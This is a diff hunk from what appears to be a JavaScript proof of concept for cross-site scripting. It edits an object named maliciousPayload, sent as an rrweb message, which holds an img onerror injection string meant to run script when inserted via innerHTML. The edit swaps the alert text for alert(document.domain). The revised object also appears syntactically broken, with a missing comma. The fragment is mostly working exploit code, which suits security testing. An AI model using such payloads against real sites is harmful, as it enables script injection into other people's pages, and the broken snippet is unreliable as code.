@@ -11,12 +11,11 @@
         // The malicious payload containing the XSS vector
         const maliciousPayload = {
             type: "rrweb",
-            event: {
-                data: {
-                    // This payload, when unsafely inserted via innerHTML, runs JS.
-                    text: "<h1>Hacked!</h1><img src=x onerror=alert('XSS executed on parent domain!')>"
-                }
-            },
+           event: {
+        data: {
+            text: "<h1>Hacked!</h1><img src=x onerror=alert(document.domain)>" // No quotes needed around document.domain
+        }
+    }
             origin: window.location.origin,
             isCheckout: false
         };
